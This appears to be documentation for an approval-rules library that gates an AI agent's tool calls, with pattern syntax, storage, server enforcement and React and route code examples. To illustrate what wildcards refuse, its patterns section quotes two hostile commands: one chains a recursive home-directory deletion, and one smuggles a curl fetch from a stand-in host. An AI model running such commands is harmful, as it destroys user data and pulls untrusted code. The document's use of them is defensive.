Approval rules: what a person decided once, applied to the calls that follow. A decision is `allow-once`, `allow-session`, `allow-always`, `deny-once` or `deny-always`. A session or always decision leaves a rule over the tool (`tool`, a name or a glob such as `mcp_github_*`), narrowed by argument patterns when given (`args: { command: 'npm test*' }`, with dotted names for nested arguments) or by a test of your own (`when`). When an allow rule and a deny rule both match a call, the deny rule wins.

**The patterns.** A pattern matches the whole argument. `*` matches any run of characters except shell operators: `;`, `&`, `|`, `` ` ``, `<`, `>`, `$(` and line breaks. So `npm test*` allows `npm test -- --watch`, but not `npm test && rm -rf ~` or `npm test $(curl evil.sh)`. `**` matches anything, operators included. `?` matches one character, and `\` makes the next one literal. Numbers and booleans match as text. Arrays, objects and missing arguments match no pattern.

**What it does.** `decide(request, decision, { reason, input, args })` records a person's decision, and the rule it leaves. `answer(request)` answers from the rules when one covers the call, recorded as decided by that rule. `match`, `addRule`, `removeRule` and `clearSession` work on the rules directly. `onAudit` receives every decision, with who made it (a person or a rule), the rule, the reason and any edited arguments, as well as every rule added or removed and every session cleared.

**Where rules are kept.** Session rules stay in memory until the page reloads or `clearSession()` runs. `always` rules go to `storage`: by default in memory, `webStorageRules()` for `localStorage`, or your own `{ load, save }`, which may be async. A rule's `when` is code, and is never saved. Rules are loaded after the first render, so a server render and the hydrating client agree. A call that arrives before they load is shown to a person.

**On the server.** The same rules, as AI SDK 7's `toolApproval`: `streamText({ toolApproval: toToolApproval(rules) })` approves or denies a call a rule covers, and asks a person about the rest. The SDK checks it again on an approved call before running it, with edited arguments too. Rules a client sends are the choices of the person using it, so apply them to that person's runs only. Keep rules that protect other people on the server.

**AG-UI and ACP.** With `useAgUiAgent`, an approval's resume payload is `{ approved, reason?, input? }`. For the Agent Client Protocol's `session/request_permission`:

- `decisionsFromAcpOptions(request.options)` gives the choices to offer.
- `toAcpPermissionResponse(decision, request.options)` answers with the option of the same kind (`allow_once`, `allow_always`, `reject_once`, `reject_always`).
- `fromAcpPermissionRequest(request)` turns the request into the card's.

ACP has no session option, so `allow-session` answers `allow_once` and leaves the session rule on the client. These helpers are types and functions only, with no ACP package to install.

**Sending a person's rules with each request.** For the route to decide with the person's own rules, the page sends them with every request. The transport is made once and the rules change between requests, so `body` is a function, called as each request goes out. `policy.getRules()` returns the rules as they are at that moment, as plain data. It is the same function for the policy's life, so the transport is still made once. A "For this session" rule is in it as soon as the person chooses it, so the rule goes out with the request that carries that approval, and the server decides the run's next calls with it. Reading a ref in `body` would work too, but `react-hooks/refs` reports it.

The page:

```tsx
'use client';

import { useChat } from '@ai-sdk/react';
import { DefaultChatTransport, lastAssistantMessageIsCompleteWithApprovalResponses } from 'ai';
import { useMemo } from 'react';
import { AgentMessage, useApprovalPolicy, webStorageRules } from 'signoff-ui';

const storage = webStorageRules(); // once, outside the component

export function Run() {
  const policy = useApprovalPolicy({ storage });
  const { getRules } = policy;
  const transport = useMemo(
    () => new DefaultChatTransport({ api: '/api/chat', body: () => ({ rules: getRules() }) }),
    [getRules],
  );
  const { messages, addToolApprovalResponse } = useChat({
    transport,
    sendAutomaticallyWhen: lastAssistantMessageIsCompleteWithApprovalResponses,
  });
  return messages.map((m) => (
    <AgentMessage key={m.id} message={m} approvalPolicy={policy} onToolApproval={addToolApprovalResponse} />
  ));
}
```

The route, `app/api/chat/route.ts`:

```ts
import { convertToModelMessages, stepCountIs, streamText, type UIMessage } from 'ai';
import { parseApprovalRules, toToolApproval } from 'signoff-ui/core';

export async function POST(req: Request) {
  const { messages, rules }: { messages: UIMessage[]; rules?: unknown } = await req.json();
  const result = streamText({
    model,
    messages: await convertToModelMessages(messages, { tools }),
    tools,
    // This person's rules, for this person's run.
    toolApproval: toToolApproval(parseApprovalRules(rules)),
    stopWhen: stepCountIs(10),
  });
  return result.toUIMessageStreamResponse({ originalMessages: messages });
}
```

**The server's rules win.** Rules the server keeps for everyone, such as one that denies `git push`, go first. Make them with `toToolApproval(SERVER_RULES, { otherwise: 'not-applicable' })`, and ask the person's `toToolApproval(parseApprovalRules(rules))` only when that returns `'not-applicable'`. A rule a client sends then can't approve a call the server's rules deny.

The route gets whatever the client sent, so `parseApprovalRules` checks it: each field and its type, at most 100 rules, 20 argument patterns in a rule, 500 characters in a string, and one `*` in a pattern, `**` counting as one. Each `*` more can make a pattern take seconds to match a long argument, which would hold up the server. Other limits go in the second argument, such as `parseApprovalRules(rules, { maxWildcards: 2 })`. A rule that fails a check is left out.

A rule the server doesn't get still holds on the page: the server asks, and the policy answers without showing anyone a card. That covers rules with a `when`, which `getRules()` leaves out: `when` is code, and without it the rule would cover more calls than it does. `toPlainRules(rules)` does the same for rules kept outside the hook.
